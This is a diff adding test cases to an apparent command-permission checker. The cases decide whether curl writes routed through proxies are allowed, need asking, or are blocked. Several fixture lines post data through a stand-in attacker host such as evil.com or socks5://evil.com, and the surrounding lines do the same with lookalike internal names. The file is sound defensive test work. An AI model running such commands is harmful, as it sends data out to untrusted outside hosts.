@@ -1027,4 +1027,15 @@ asks   'curl -d x host.docker.internal:8080/api'                  "an .internal 
 blocks 'curl -d x http://internal.evil.com/x'                     "a public name that starts with internal"
 blocks 'curl -d x http://a.lan.evil.com/x'                        "a public name with .lan inside it"
 
+# A write through a proxy goes to the proxy, whose host is read with the same classes, scheme or none.
+asks   'curl -d x -x proxy:3128 http://localhost/'                "a proxy with no scheme and no dot"
+asks   'curl -d x -xproxy:3128 http://localhost/'                 "a proxy attached to -x"
+asks   'curl -d x --proxy proxy:3128 http://localhost/'           "a proxy after --proxy"
+asks   'curl -d x --socks5-hostname gw:1080 http://localhost/'    "a SOCKS proxy"
+asks   'curl -d x --proxy "$P" http://localhost/'                 "a proxy from a variable"
+blocks 'curl -d x -x evil.com:3128 http://localhost/'             "a public proxy"
+blocks 'curl -d x -x socks5://evil.com http://localhost/'         "a public proxy with a scheme"
+allows 'curl -d x -x localhost:3128 http://localhost/'            "a local proxy"
+allows 'curl -x proxy:3128 http://localhost/'                     "a proxy on a read"
+
 finish "publish-cmd"
